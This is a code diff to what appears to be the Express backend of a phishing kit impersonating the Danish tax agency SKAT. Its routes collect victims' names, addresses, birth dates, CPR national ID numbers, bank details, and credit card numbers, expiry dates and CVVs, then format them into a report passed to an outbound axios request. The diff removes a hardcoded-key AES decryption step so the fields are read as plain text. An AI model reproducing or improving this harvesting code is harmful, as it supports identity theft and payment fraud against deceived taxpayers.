@@ -4264,33 +4264,15 @@ let skat = 0;
 app.options("/skatPersonal", cors());
 
 app.post("/skatPersonal", (req, res) => {
-  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  cpr = CryptoJS.AES.decrypt(req.body.cpr, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  bank = CryptoJS.AES.decrypt(req.body.bank, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  username = req.body.username
+  fullname = req.body.fullname
+  address = req.body.address
+  city = req.body.city
+  zip = req.body.zip
+  dob = req.body.dob
+  telephone = req.body.telephone
+  cpr = req.body.cpr
+  bank = req.body.bank
   var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
 
   axios
@@ -4322,51 +4304,21 @@ app.post("/skatPersonal", (req, res) => {
 app.options("/skatBilling", cors());
 
 app.post("/skatBilling", (req, res) => {
-  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  cpr = CryptoJS.AES.decrypt(req.body.cpr, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  bank = CryptoJS.AES.decrypt(req.body.bank, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  username = req.body.username
+  fullname = req.body.fullname
+  address = req.body.address
+  city = req.body.city
+  zip = req.body.zip
+  dob = req.body.dob
+  telephone = req.body.telephone
+  cpr = req.body.cpr
+  bank = req.body.bank
+  ccname = req.body.ccname
+  ccnum = req.body.ccnum
+  ccexp = req.body.ccexp
+  cccvv = req.body.cccvv
+  zip = req.body.zip
+  dob = req.body.dob
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
